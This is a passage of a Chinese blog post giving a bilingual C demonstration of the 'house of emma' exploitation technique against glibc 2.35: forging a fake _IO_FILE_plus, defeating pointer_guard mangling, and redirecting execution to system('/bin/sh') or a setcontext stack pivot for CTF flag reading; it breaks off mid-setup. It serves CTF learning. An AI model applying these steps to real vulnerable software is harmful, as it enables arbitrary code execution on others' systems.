---
title: glibc 2.35 pwn——house of emma示例程序
date: 2023-02-28 22:16:00
categories:
- 学习笔记
- glibc 系列
---
这是笔者写的house of emma示例程序，需要在ubuntu 22.04上编译运行，可以选择orw模式和getshell模式两种利用方式，每一步都有详细的解释，所有说明文字均使用不同颜色注明与高亮。请读者自取学习。如果需要进行调试，可以在需要调试的代码段插入sleep函数，然后就可以断在那里了。

若程序在运行过程中出现任何非预期情况，请及时与笔者联系，以便及时进行修改。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define GETSHELL_MODE 1
#define ORW_MODE 2

// IMPORTANT! YOU CAN CHANGE THE MODE HERE
int mode = ORW_MODE;
char* sh = "/bin/sh";
char* flag = "./flag";
size_t space[0x100];

int main() {
    setvbuf(stdin,0LL,2,0LL);
    setvbuf(stdout,0LL,2,0LL);
    puts("\033[32mHello! today let's learn something about house of emma.\033[0m");
    puts("\033[32m本程序用于演示house of emma的漏洞利用原理。\033[0m");
    puts("\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m");
    puts("\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m");
    puts("\033[32mHouse of emma is used for high version of glibc, it utilizes _IO_FILE struct to exploit.\033[0m");
    puts("\033[32mhouse of emma 适用于高版本glibc，它使用_IO_FILE结构体进行漏洞利用。\033[0m");
    puts("\033[32mSame as other way of exploitation with _IO_FILE, it also use fake _IO_FILE struct.\033[0m");
    puts("\033[32m与其他利用_IO_FILE结构体漏洞的方法相同，它也利用了伪造的_IO_FILE结构体。\n\033[0m");
    puts("\033[32mIt can be triggered by function __malloc_assert, so it always go with heap vulnerabilities.\033[0m");
    puts("\033[32m它可以通过函数__malloc_assert触发，因此它常常与堆漏洞相联系。\033[0m");
    puts("\033[32mFirst we need to know the structure of _IO_FILE in glibc 2.35:\033[0m"
         "\033[32m首先我们需要了解一下glibc 2.35版本下_IO_FILE结构体的内容：\n\033[0m"
         "\033[33m(line 49, /libio/bits/types/struct_FILE.h)\033[0m");
    puts("\033[34mstruct _IO_FILE\n"
         "{\n"
         "  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n"
         "\n"
         "  /* The following pointers correspond to the C++ streambuf protocol. */\n"
         "  char *_IO_read_ptr;\t/* Current read pointer */\n"
         "  char *_IO_read_end;\t/* End of get area. */\n"
         "  char *_IO_read_base;\t/* Start of putback+get area. */\n"
         "  char *_IO_write_base;\t/* Start of put area. */\n"
         "  char *_IO_write_ptr;\t/* Current put pointer. */\n"
         "  char *_IO_write_end;\t/* End of put area. */\n"
         "  char *_IO_buf_base;\t/* Start of reserve area. */\n"
         "  char *_IO_buf_end;\t/* End of reserve area. */\n"
         "\n"
         "  /* The following fields are used to support backing up and undo. */\n"
         "  char *_IO_save_base; /* Pointer to start of non-current get area. */\n"
         "  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n"
         "  char *_IO_save_end; /* Pointer to end of non-current get area. */\n"
         "\n"
         "  struct _IO_marker *_markers;\n"
         "\n"
         "  struct _IO_FILE *_chain;\n"
         "\n"
         "  int _fileno;\n"
         "  int _flags2;\n"
         "  __off_t _old_offset; /* This used to be _offset but it's too small.  */\n"
         "\n"
         "  /* 1+column number of pbase(); 0 is unknown. */\n"
         "  unsigned short _cur_column;\n"
         "  signed char _vtable_offset;\n"
         "  char _shortbuf[1];\n"
         "\n"
         "  _IO_lock_t *_lock;\n"
         "#ifdef _IO_USE_OLD_IO_FILE\n"
         "};\n\033[0m");

    puts("\033[32mThe key element we need to forge is the *vtable pointer.\033[0m");
    puts("\033[32m其中的关键就是*vtable指针。\033[0m");
    puts("\033[32mIt's worth noticing that we need to write correct *_lock value in our fake _IO_FILE.\033[0m");
    puts("\033[32m值得注意的是，我们需要写入正确的*_lock指针值到伪造的_IO_FILE结构体中。\033[0m");
    puts("\033[32mThe value of *_lock should be \033[31m_IO_stdfile_1_lock.\033[0m");
    puts("\033[32m*_lock的值应该是\033[31m_IO_stdfile_1_lock.\033[0m");
    puts("\033[32mSo that we need to know the loading base address of libc.\033[0m");
    puts("\033[32m所以我们需要知道libc的加载基地址。\n\033[0m");

    puts("\033[35mNow let's get loading base address of libc through the address of function puts().\033[0m");
    puts("\033[35m现在让我们通过puts()函数获取一下libc的加载基地址。\033[0m");

    int(*func)(const char*)  = puts;
    printf("\033[32mThe address of function puts() is: \033[31m%p\n\033[0m", func);
    printf("\033[32mputs函数的地址为: \033[31m%p\n\033[0m", func);
    printf("\033[32mSo that the loading address of libc is: \033[31m%p\n\033[0m", func - 0x80ed0);
    printf("\033[32m因此libc的加载地址为: \033[31m%p\n\033[0m", func - 0x80ed0);
    puts("\033[33m(The offset address of function puts() is 0x80ed0)\033[0m");
    puts("\033[33m(puts函数的偏移量为0x80ed0)\n\033[0m");

    size_t libc_base = (size_t)(func - 0x80ed0);
    size_t stderr_ptr = (size_t)(libc_base + 0x21a860);

    printf("\033[32mSince we know the libc base address, we can also know the address of pointer stderr: \033[31m%p\033[0m\n", (void*)stderr_ptr);
    printf("\033[32m既然现在我们已经知道了libc的加载地址，我们也可以获得stderr指针的地址: \033[31m%p\033[0m\n", (void*)stderr_ptr);

    puts("\033[32mNow let's satisfy the second prerequisite of the exploit: \033[0m");
    puts("\033[32m下面让我们构造一下这个漏洞利用的第二个前提条件: \033[0m");
    puts("\033[33mGet the value of pointer_guard or change it to a known value.\033[0m");
    puts("\033[33m获取到pointer_guard的值并将其修改为一个已知值。\033[0m");
    puts("\033[32mOur house of emma has a stable call chain, and we'll need the value to guide rip to the function we want.\033[0m");
    puts("\033[32m我们的house of emma利用方式有一条完整的函数调用链，我们需要这个pointer_guard的值来引导rip到我们想要的函数。\033[0m");
    puts("\033[32mWhere the value is used will be introduced later.\033[0m");
    puts("\033[32m我们之后将会介绍这个pointer_guard的地址在什么地方。\033[0m");
    puts("\033[32mIt's worth noticing that\033[31m the value of pointer guard is not located in libc, while before libc.\033[0m");
    puts("\033[32m需要注意的是pointer guard的值并不在libc中，而是在libc的低地址处。\033[0m");
    puts("\033[32mIf you use pwndbg, you can see that before libc, there exists an anonymous space, with its size of 0x3000.\033[0m");
    puts("\033[32m如果使用pwndbg，你可以看到在libc前面有一个匿名的内存区域，大小为0x3000。\033[0m");
    puts("\033[32mThe tls struct is located in this anonymous area, which includes the value of pointer_guard.\033[0m");
    puts("\033[32mtls结构体就位于这个匿名的内存空间中，它包含有pointer_guard。\033[0m");
    puts("\033[32mTo be more detail, the value of pointer_guard is located in (libc_base - 0x3000 + 0x770)\033[0m");
    puts("\033[32m更具体地说，pointer_guard的值应该位于(libc_base - 0x3000 + 0x770)\n\033[0m");

    puts("\033[32mActually, the name of the struct is \033[31mtcbhead_t\033[32m. Here is the structure:\033[0m");
    puts("\033[32m实际上，这个结构体的名字是\033[31mtcbhead_t\033[32m. 下面是它的构造:\033[0m");
    puts("\033[33m(line 36, /sysdeps/x86_64/nptl/tls.h)\033[0m");
    puts("\033[34mtypedef struct\n"
         "{\n"
         "  void *tcb;\t\t/* Pointer to the TCB.  Not necessarily the\n"
         "\t\t\t   thread descriptor used by libpthread.  */\n"
         "  dtv_t *dtv;\n"
         "  void *self;\t\t/* Pointer to the thread descriptor.  */\n"
         "  int multiple_threads;\n"
         "  int gscope_flag;\n"
         "  uintptr_t sysinfo;\n"
         "  uintptr_t stack_guard;\n"
         "  uintptr_t pointer_guard;\n"
         "  unsigned long int unused_vgetcpu_cache[2];\n"
         "  /* Bit 0: X86_FEATURE_1_IBT.\n"
         "     Bit 1: X86_FEATURE_1_SHSTK.\n"
         "   */\n"
         "  unsigned int feature_1;\n"
         "  int __glibc_unused1;\n"
         "  /* Reservation of some values for the TM ABI.  */\n"
         "  void *__private_tm[4];\n"
         "  /* GCC split stack support.  */\n"
         "  void *__private_ss;\n"
         "  /* The lowest address of shadow stack,  */\n"
         "  unsigned long long int ssp_base;\n"
         "  /* Must be kept even if it is no longer used by glibc since programs,\n"
         "     like AddressSanitizer, depend on the size of tcbhead_t.  */\n"
         "  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n"
         "\n"
         "  void *__padding[8];\n"
         "} tcbhead_t;\033[0m");
    puts("\033[32mWe can see that the stack guard is right above the pointer guard, so we can't absolutely change the stack_guard.\033[0m");
    puts("\033[32m我们可以发现stack_guard就在pointer_guard的上面，因此我们绝对不能修改stack_guard的值。\033[0m");
    printf("\033[32mLet's calculate the address of pointer_guard: \033[31m%p\033[0m\n", (size_t*)(libc_base - 0x3000 + 0x770));
    printf("\033[32m让我们计算一下pointer_guard的地址: \033[31m%p\033[0m\n", (size_t*)(libc_base - 0x3000 + 0x770));

    size_t* pointer_guard_address = (size_t*)(libc_base - 0x3000 + 0x770);
    printf("\033[32mThe value of pointer_guard is: \033[31m%#zx\033[0m\n", *pointer_guard_address);
    printf("\033[32mpointer_guard的值为: \033[31m%#zx\033[0m\n", *pointer_guard_address);
    puts("\033[32mIn CTF problems you can't always get the original value of pointer_guard, but you can also change it to a known value.\033[0m");
    puts("\033[32m在CTF赛题中你可能不能获取到pointer_guard的值，但你可以将其改写为一个已知值。\n\033[0m");

    puts("\033[32mOK, now we can try to forge a _IO_FILE struct.\033[0m");
    puts("\033[32m那么现在我们就来开始伪造_IO_FILE结构体。\033[0m");
    puts("\033[32mAttention: what we forge is actually _IO_FILE_plus struct, which contains a _IO_FILE struct and a vtable pointer(_IO_jump_t*)\033[0m");
    puts("\033[32m注意：我们伪造的实际上是_IO_FILE_plus结构体，其包含_IO_FILE结构体的所有内容以及一个vtable指针(_IO_jump_t*)\033[0m");

    struct _IO_FILE* fake_file_struct = (struct _IO_FILE*)malloc(0x100);
    size_t* vtable = (size_t*)((char*)fake_file_struct + sizeof (struct _IO_FILE));

    printf("\033[32mWe just allocate a fake _IO_FILE_plus struct into the heap: \033[31m%p\033[m\n", fake_file_struct);
    printf("\033[32m我们刚刚分配了一个假的_IO_FILE_plus结构体到堆: \033[31m%p\033[m\n", fake_file_struct);
    printf("\033[32mThe address of fake _IO_FILE_plus is: \033[31m%p\033[0m\n", fake_file_struct);
    printf("\033[32m这个假的_IO_FILE_plus结构体的地址为: \033[31m%p\033[0m\n", fake_file_struct);
    printf("\033[32mThe address of vtable pointer is: \033[31m%p\033[0m\n", vtable);
    printf("\033[32mvtable指针的地址为: \033[31m%p\033[0m\n", vtable);
    puts("\033[32mThen we are going to change the value of _lock and vtable pointer.\033[0m");
    puts("\033[32m然后我们来修改_lock和vtable指针的值。\033[0m");
    puts("\033[32mThe _lock should be changed into \033[31m_IO_stdfile_1_lock\033[32m, which is in \033[31m(libc_base + 0x21ba70).\033[0m");
    puts("\033[32m_lock的值应该被修改为\033[31m_IO_stdfile_1_lock\033[32m, 它的地址为\033[31m(libc_base + 0x21ba70).\033[0m");
    puts("\033[32mThe vtable should be changed into \033[31m(_IO_cookie_jumps + 0x38)\033[32m, "
         "which points to function \033[31m_IO_file_xsputn.\033[0m");
    puts("\033[32mvtable指针应该被修改为\033[31m(_IO_cookie_jumps + 0x38)\033[32m, "
         "其指向函数\033[31m_IO_file_xsputn.\033[0m\n");

    printf("\033[32mBefore alteration: fake_file_struct->_lock = \033[33m%p\033[0m\n", fake_file_struct->_lock);
    printf("\033[32m修改前: fake_file_struct->_lock = \033[33m%p\033[0m\n", fake_file_struct->_lock);
    fake_file_struct->_lock = (void *) (libc_base + 0x21ba70);
    printf("\033[32mAfter alteration: fake_file_struct->_lock = \033[31m%p\033[0m\n", fake_file_struct->_lock);
    printf("\033[32m修改后: fake_file_struct->_lock = \033[31m%p\033[0m\n\n", fake_file_struct->_lock);

    printf("\033[32mBefore alteration: fake_file_struct->vtable = \033[33m%#zx\033[0m\n", *vtable);
    printf("\033[32m修改前: fake_file_struct->vtable = \033[33m%#zx\033[0m\n", *vtable);
    *vtable = (size_t)(libc_base + 0x215b80 + 0x38);
    printf("\033[32mAfter alteration: fake_file_struct->vtable = \033[31m%#zx\033[0m\n", *vtable);
    printf("\033[32m修改后: fake_file_struct->vtable = \033[31m%#zx\033[0m\n\n", *vtable);

    size_t* top_chunk_size = (size_t*)((char*)fake_file_struct + 0x108);
    printf("\033[32mThrough pwndbg, we can see that the size of top chunk is at fake_file_struct + 0x108 = %p\033[0m\n", top_chunk_size);
    printf("\033[32m通过pwndbg我们可以看到top chunk的大小保存在fake_file_struct + 0x108 = %p\033[0m\n", top_chunk_size);
    printf("\033[32mThe value of top_chunk->size is: %#zx\033[0m\n", *top_chunk_size);
    printf("\033[32mtop chunk的大小top_chunk->size为: %#zx\033[0m\n", *top_chunk_size);
    puts("\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m");
    puts("\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m");
    puts("\033[33m(line 2617, /malloc/malloc.c)\033[0m");
    puts("\033[34m  assert ((old_top == initial_top (av) && old_size == 0) ||\n"
         "          ((unsigned long) (old_size) >= MINSIZE &&\n"
         "           prev_inuse (old_top) &&\n"
         "           ((unsigned long) old_end & (pagesize - 1)) == 0));\n\033[0m");
    puts("\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m");
    puts("\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m");
    puts("\033[32mBecause in malloc.c there is a #define statement: \033[0m");
    puts("\033[32m因为在malloc.c中有一个#define语句: \n\033[0m");
    puts("\033[33m(line 292, /malloc/malloc.c)\033[0m");
    puts("\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n"
         "\t __malloc_assert(assertion, file, line, function)\n\033[0m");
    puts("\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m");
    puts("\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m");

    puts("\033[32mThe content of function __malloc_assert is: \033[0m");
    puts("\033[32m__malloc_assert函数的内容为: \033[0m");
    puts("\033[33m(line 297, /malloc/malloc.c)\033[0m");
    puts("\033[34mstatic void\n"
         "__malloc_assert (const char *assertion, const char *file, unsigned int line,\n"
         "\t\t const char *function)\n"
         "{\n"
         "  (void) __fxprintf (NULL, \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n\",\n"
         "\t\t     __progname, __progname[0] ? \": \" : \"\",\n"
         "\t\t     file, line,\n"
         "\t\t     function ? function : \"\", function ? \": \" : \"\",\n"
         "\t\t     assertion);\n"
         "  fflush (stderr);\n"
         "  abort ();\n"
         "}\033[0m\n");

    puts("\033[32mWhile in function __fxprintf, it will utilize stderr to output something, and that is our chance.\033[0m");
    puts("\033[32m函数__fxprintf会利用stderr来输出错误信息，这就是我们利用的机会。\033[0m");
    puts("\033[32mThrough forging fake _IO_FILE struct, we can turn to anywhere that can be executed.\033[0m");
    puts("\033[32m通过伪造_IO_FILE结构体，我们可以执行任意地址的代码。\033[0m");
    puts("\033[32mThe easiest way in CTF is turning the execution flow into one gadget.\033[0m");
    puts("\033[32m在CTF比赛中最简单的方法就是将执行流转到one_gadget中。\033[0m");
    puts("\033[32mBut one gadgets in libc 2.35 all have many constraints, which we need to pay attention to.\033[0m");
    puts("\033[32m但glibc 2.35版本的one gadget有很多的限制条件需要注意。\033[0m");
    puts("\033[32mMoreover, many problems today have sandboxes, where you cannot use the syscall EXECVE.\033[0m");
    puts("\033[32m另外，现在的很多赛题都有沙箱，我们可能不能调用execve的系统调用。\033[0m");
    puts("\033[32mSo stack pivoting may be the most common step in exploitation.\033[0m");
    puts("\033[32m因此栈迁移就是本方法利用中较为常用的手段了。\n\033[0m");

    puts("\033[32mIn function __vxprintf_internal, which is called indirectly by __fxprintf, it will call function _IO_cookie_read: \033[0m");
    puts("\033[32m__fxprintf函数会间接调用到__vxprintf_internal函数，后者会调用_IO_cookie_read函数: \033[0m");
    puts("\033[34m<__vfprintf_internal+280>    call   qword ptr [r12 + 0x38]\033[0m");
    puts("\033[32mThe 'r12' here is (_IO_cookie_jumps + 0x38), which is the value of *vtable we wrote in before.\033[0m");
    puts("\033[32m这里的r12寄存器的值就是(_IO_cookie_jumps + 0x38), 这就是我们前面写的*vtable值。\033[0m");
    puts("\033[32mAs you can see in struct _IO_cookies_jump: \033[0m");
    puts("\033[32m就如_IO_cookies_jump中代码展示的这样: \033[0m");
    puts("\033[33m(line 111, /libio/iofopncook.c)\033[0m");
    puts("\033[34mstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {\n"
         "  JUMP_INIT_DUMMY,\n"
         "  JUMP_INIT(finish, _IO_file_finish),\n"
         "  JUMP_INIT(overflow, _IO_file_overflow),\n"
         "  JUMP_INIT(underflow, _IO_file_underflow),\n"
         "  JUMP_INIT(uflow, _IO_default_uflow),\n"
         "  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n"
         "  JUMP_INIT(xsputn, _IO_file_xsputn),\n"
         "  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n"
         "  JUMP_INIT(seekoff, _IO_cookie_seekoff),\n"
         "  JUMP_INIT(seekpos, _IO_default_seekpos),\n"
         "  JUMP_INIT(setbuf, _IO_file_setbuf),\n"
         "  JUMP_INIT(sync, _IO_file_sync),\n"
         "  JUMP_INIT(doallocate, _IO_file_doallocate),\n"
         "  JUMP_INIT(read, _IO_cookie_read),\n"
         "  JUMP_INIT(write, _IO_cookie_write),\n"
         "  JUMP_INIT(seek, _IO_cookie_seek),\n"
         "  JUMP_INIT(close, _IO_cookie_close),\n"
         "  JUMP_INIT(stat, _IO_default_stat),\n"
         "  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n"
         "  JUMP_INIT(imbue, _IO_default_imbue),\n"
         "};\n\033[0m");
    puts("\033[31m(_IO_cookie_jumps + 0x38) \033[32mpoints to \033[35m_IO_file_xsputn\033[32m.\033[0m");
    puts("\033[31m(_IO_cookie_jumps + 0x38) \033[32m指向的是\033[35m_IO_file_xsputn\033[32m.\033[0m");
    puts("\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32mpoints to \033[35m_IO_cookie_read\033[32m.\033[0m");
    puts("\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32m指向的是\033[35m_IO_cookie_read\033[32m.\033[0m");
    puts("\033[32mSo here we let it call _IO_cookie_read function.\033[0m");
    puts("\033[32m所以这里我们让程序调用_IO_cookie_read函数.\n\033[0m");

    puts("\033[32mThen let's have a look at _IO_cookie_read function.\033[0m");
    puts("\033[32m让我们看一下_IO_cookie_read函数的内容。\033[0m");
    puts("\033[34m<_IO_cookie_read>:\tendbr64 \n"
         "   <_IO_cookie_read+4>:\tmov    rax,QWORD PTR [rdi+0xe8]\n"
         "   <_IO_cookie_read+11>:\tror    rax,0x11\n"
         "   <_IO_cookie_read+15>:\txor    rax,QWORD PTR fs:0x30\n"
         "   <_IO_cookie_read+24>:\ttest   rax,rax\n"
         "   <_IO_cookie_read+27>:\tje     <_IO_cookie_read+38>\n"
         "   <_IO_cookie_read+29>:\tmov    rdi,QWORD PTR [rdi+0xe0]\n"
         "   <_IO_cookie_read+36>:\t\033[31mjmp    rax\033[34m\n"
         "   <_IO_cookie_read+38>:\tmov    rax,0xffffffffffffffff\n"
         "   <_IO_cookie_read+45>:\tret\033[0m\n");
    puts("\033[32mAs you can see, it directly calls rax, and 'rdi' here is actually our fake _IO_FILE_plus address.\033[0m");
    puts("\033[32m可以看到，它直接call rax，这里的rdi实际上就是假的_IO_FILE_plus结构体的地址。\033[0m");
    puts("\033[32mSo that we can write any executable address into [rdi+0xe8].\033[0m");
    puts("\033[32m因此我们可以将任意可执行的地址写入到[rdi+0xe8].\033[0m");
    puts("\033[32mHowever, don't forget some instructions in the middle.\033[0m");
    puts("\033[32m但是，别忘了中间还有几条指令。\033[0m");
    puts("\033[32mHere, you can see a 'ror' instruction and a 'xor' instruction that change the value of rax.\033[0m");
    puts("\033[32m这里你可以看到有一个ror指令和一个xor指令，这些指令会修改rax的值。\033[0m");
    puts("\033[32mThat is actually a kind of protection strategy used in high versions of glibc ---- encrypting the address.\033[0m");
    puts("\033[32m这实际上是高版本glibc的一种保护方式——将地址进行简单加密。\033[0m");
    puts("\033[32mHere, these two instruction is decrypting rax, first ror 11 bits, and second xor fs:0x30h, which is our \033[31mpointer_guard.\033[0m");
    puts("\033[32m这里的这两条指令实际上是在解密rax，首先循环右移0x11位，然后异或fs:0x30h，这实际上就是\033[31mpointer_guard.\033[0m");
    puts("\033[32mNow you know that why we need the value of pointer_guard, it's important for us to encrypt executable address.\033[0m");
    puts("\033[32m现在你应该知道为什么我们需要修改pointer_guard的值了，它对于地址的加密过程很重要。\033[0m");
    puts("\033[32mThe encryption algorithm is easy to get: first xor pointer_guard, and second rol 0x11 bits.\033[0m");
    puts("\033[32m加密方式很好推出来：首先异或pointer_guard，然后循环左移0x11位。\n\033[0m");

    puts("\033[32mPay attention to the instruction before 'jmp rax': mov rdi, QWORD PTR [rdi+0xe0]\033[0m");
    puts("\033[32m注意'jmp rax'之前的指令: mov rdi, QWORD PTR [rdi+0xe0]\n\033[0m");
    puts("\033[32mIf there is not any sandbox, we can let rax=system() address, and [rdi+0xe0]='/bin/sh' address.\033[0m");
    puts("\033[32m如果这里没有沙箱，我们可以让rax等于system函数地址，[rdi+0xe0]等于字符串/bin/sh的地址\033[0m");
    puts("\033[32mElse, you can also fill it with 'pcop' to trigger stack pivoting and open, read, write flag file.\033[0m");
    puts("\033[32m否则，我们也可以填充pcop的地址来触发栈迁移，然后打开、读、写flag文件。\n\033[0m");

    if(mode == 1){
        puts("\033[35mYou chose the getshell mode.\033[0m");
        puts("\033[35m你选择了getshell模式。\033[0m");
        puts("\033[32mSo that we'll write '/bin/sh' address into [rdi+0xe0] and encrypted system() address into [rdi+0xe8]\033[0m");
        puts("\033[32m所以我们在[rdi+0xe0]处写入字符串/bin/sh的地址，将加密后的system函数地址写入[rdi+0xe8]处。\033[0m");

        char** sh_addr = (char**)((char*)fake_file_struct + 0xe0);
        printf("\033[32mThe address of string '/bin/sh' should be written in: \033[31m%p\n\033[0m", sh_addr);
        printf("\033[32m字符串'/bin/sh'的地址应该被写到: \033[31m%p\n\033[0m", sh_addr);
        *sh_addr = sh;
        printf("\033[32m指针解引用的值为: \033[31m%p\033[0m\n", *sh_addr);

        size_t* system_addr = (size_t*)((char*)fake_file_struct + 0xe8);
        printf("\033[32mThe address of function system() should be written in: \033[31m%p\n\033[0m", system_addr);
        printf("\033[32m函数system()的地址应该被写到: \033[31m%p\n\033[0m", system_addr);
        *system_addr = (size_t)system;
        printf("\033[32mNow the value of the pointer is: \033[31m%#zx\033[0m\n", *system_addr);
        printf("\033[32m指针解引用的值为: \033[31m%#zx\033[0m\n", *system_addr);
        printf("\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m", *pointer_guard_address);
        printf("\033[32m然后我们需要让这个值异或pointer_guard: \033[33m%#zx.\n\033[0m", *pointer_guard_address);
        *system_addr ^= *pointer_guard_address;
        printf("\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m", *system_addr);
        printf("\033[32m异或之后[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m", *system_addr);
        puts("\033[32mThen we need to let it rol 0x11 bits.\n\033[0m");
        puts("\033[32m然后我们循环左移0x11位:\n\033[0m");
        *system_addr = (*system_addr << 0x11) + (*system_addr >> 0x2f);
        printf("\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n", *system_addr);
        printf("\033[32m循环左移后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n", *system_addr);
    }else if(mode == 2){
        puts("\033[32mYou chose the orw mode.\033[0m");
        puts("\033[32m你选择了orw模式。\033[0m");
        puts("\033[1;31mIMPORTANT: You must make sure that there is a flag file in this directory, or we'll be unable to read.\033[0m");
        puts("\033[1;31m注意：你必须保证当前文件夹下有一个flag文件，否则该程序将无法读取。\n\033[0m");

        puts("\033[32mIn glibc 2.35, we usually use setcontext() function to trigger stack pivoting, but with a little difference from lower versions.\033[0m");
        puts("\033[32m在glibc 2.35中，我们一般使用setcontext函数进行栈迁移，但与低版本的glibc的利用方式有一些小差别。\033[0m");
        puts("\033[32mIn lower version, the instruction that changes the rsp is: 'mov rsp, [rdi+xx]'.\033[0m");
        puts("\033[32m在低版本glibc中，修改rsp的指令为: 'mov rsp, [rdi+xx]'.\033[0m");
        puts("\033[32mThe rdi here is our [fake _IO_FILE_plus struct + 0xe0].\033[0m");
        puts("\033[32m这里的rdi是[fake _IO_FILE_plus struct + 0xe0].\033[0m");
        puts("\033[32mBut in glibc 2.35, the instruction was changed to: \033[31m'mov rsp, [rdx+xx]'\033[32m.\033[0m");
        puts("\033[32m但是在glibc 2.35中，这条指令被修改为: \033[31m'mov rsp, [rdx+xx]'\033[32m.\033[0m");
        puts("\033[32mSo that we can't change the value of rsp only by writing forged data in our fake _IO_FILE_plus struct.\033[0m");
        puts("\033[32m所以我们不能仅通过将假的数据写入到假的_IO_FILE_plus结构体而修改rsp的值。\033[0m");
        puts("\033[32mHowever, we still have our way to exploit. It's called pcop, which is just a unique gadget.");
        puts("\033[32m但我们依然能够进行漏洞利用，需要一个pcop，这是一个特殊的gadget。\n");

        puts("\033[32mTry to use this command below in the terminal: \033[0m");
        puts("\033[32m可以尝试在终端运行以下命令：: \033[0m");
        puts("\033[1;34mobjdump -d /lib/x86_64-linux-gnu/libc.so.6 -M intel | grep '1675b'\033[0m");
        puts("\033[32mYou can see a gadget in offset \033[31m0x1675b0\033[32m: \033[0m\n");
        puts("\033[32m你可以在偏移\033[31m0x1675b0\033[32m处看到有一个gadget: \033[0m\n");
        puts("\033[34m  1675b0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]\n"
             "  1675b4:       48 89 04 24             mov    QWORD PTR [rsp],rax\n"
             "  1675b8:       ff 52 20                call   QWORD PTR [rdx+0x20]\033[0m\n");
        puts("\033[32mIt seems that we can use the value of [rdi+0x8] to change rdx to any value as we like.\033[0m");
        puts("\033[32m我们似乎可以使用[rdi+0x8]的值去修改rdx的值为任意值。\033[0m");
        puts("\033[32mAnd then we can change the rip into [rdx+0x20].\033[0m");
        puts("\033[32m然后我们就可以将rip修改到[rdx+0x20]。\033[0m");
        puts("\033[32mWe can change rdx to a place that we can control, then write setcontext() address in it to trigger stack pivoting.\033[0m");
        puts("\033[32m我们可以将rdx修改到一个我们可以控制的地方，然后将setcontext函数的地址写进去来触发栈迁移。\033[0m");
        puts("\033[32mTo keep the environment of heap, we use a space in bss segment to complete this process.\033[0m");
        puts("\033[32m为了保持堆环境，我们使用bss段的一块空间来完成这个过程。\033[0m");
        printf("\033[32mThe address of bss space is: \033[31m%p\033[32m.\033[0m\n", &space);
        printf("\033[32mbss对应地址为: \033[31m%p\033[32m.\033[0m\n\n", &space);

        puts("\033[32mWe let [rdi+0xe0] = bss address, [rdi+0xe8] = pcop address.\033[0m");
        puts("\033[32m我们让[rdi+0xe0] = bss的地址, [rdi+0xe8] = pcop的地址.\033[0m");
        size_t* bss_address = (size_t*)((char*)fake_file_struct + 0xe0);
        printf("\033[32mThe address of bss should be written in: \033[31m%p\n\033[0m", bss_address);
        printf("\033[32m这个bss的地址应该被写入: \033[31m%p\n\033[0m", bss_address);
        *bss_address = (size_t)(&space);
        printf("\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n", *bss_address);
        printf("\033[32m这个指针的值现在为: \033[31m%#zx\033[0m\n", *bss_address);

        size_t* pcop = (size_t*)((char*)fake_file_struct + 0xe8);
        printf("\033[32mThe address of pcop should be written in: \033[31m%p\n\033[0m", pcop);
        printf("\033[32mpcop的地址应该被写入到: \033[31m%p\n\033[0m", pcop);
        *pcop = (size_t)(libc_base + 0x1675b0);
        printf("\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n", *pcop);
        printf("\033[32m这个指针现在的值为: \033[31m%#zx\033[0m\n", *pcop);
        puts("\033[32mDon't forget we need to encrypt the pcop value.\033[0m");
        puts("\033[32m别忘了我们需要加密pcop的值。\033[0m");

        printf("\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m", *pointer_guard_address);
        printf("\033[32m然后我们需要让pcop与pointer_guard异或: \033[33m%#zx.\n\033[0m", *pointer_guard_address);
        *pcop ^= *pointer_guard_address;
        printf("\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m", *pcop);
        printf("\033[32m异或之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m", *pcop);

        puts("\033[32mThen we need to let it rol 0x11 bits.\033[0m");
        puts("\033[32m然后我们让它循环左移0x11位。\033[0m");
        *pcop = (*pcop << 0x11) + (*pcop >> 0x2f);
        printf("\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n", *pcop);
        printf("\033[32m循环左移之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n", *pcop);

        puts("\033[32mNow, we are ready to write something in our bss segment.\033[0m");
        puts("\033[32m现在我们准备写一些内容到bss段。\033[0m");
        puts("\033[32mNoticing that the first instruction of pcop moves [rdi+0x8] to rdx, while rdi now is address of bss.\033[0m");
        puts("\033[32m注意到pcop的第一条指令将[rdi+0x8]的值移动到rdx，而rdi此时的值是bss处的地址。\033[0m");
        printf("\033[32mSo that we can write the address of somewhere in bss to [rdi+0x8](%p).\033[0m", &(space[1]));
        printf("\033[32m所以我们可以将任意地址写到[rdi+0x8](%p)这个bss段中的地址。.\033[0m", &(space[1]));
        space[1] = (size_t)space;
        printf("\033[32m[rdi+0x8] now is: \033[31m%#zx\033[32m.\n\033[0m", space[1]);
